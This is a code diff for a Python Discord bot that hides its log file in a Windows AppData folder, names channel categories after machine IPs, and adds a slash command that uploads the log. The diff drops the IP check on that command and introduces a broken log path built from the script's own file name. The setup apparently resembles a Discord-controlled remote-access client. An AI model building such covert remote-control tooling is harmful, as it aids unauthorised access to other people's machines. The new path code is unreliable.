@@ -38,7 +38,7 @@ user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 os.makedirs(target_path, exist_ok=True)
 
-sys.stdout = open(os.path.join(target_path, "skibidi-mainmain", "log.txt"), "a", buffering=1)  # "a" = append mode, "buffering=1" = line buffering
+sys.stdout = open(os.path.join(os.path.abspath(__file__), "log.txt"), "a", buffering=1)  # "a" = append mode, "buffering=1" = line buffering
 sys.stderr = sys.stdout
 
 user_profile = os.environ['USERPROFILE']
@@ -78,11 +78,10 @@ async def status(interaction : Interaction):
 @client.slash_command(guild_ids=testServerId, description="Outputs the log file, useful for debugging.")
 async def output_log(interaction : Interaction):
     category = interaction.channel.category
-    if str(category) == str(ip):
-        await interaction.response.send_message("Sending log file...")
-        log_path = "log.txt"
-        file1 = nextcord.File(log_path, filename='log.txt')
-        await interaction.send(file=file1)
+    await interaction.response.send_message("Sending log file...")
+    log_path = "log.txt"
+    file1 = nextcord.File(log_path, filename='log.txt')
+    await interaction.send(file=file1)
 
 token = input("Token: ")
 with open("token.txt", "w") as f:
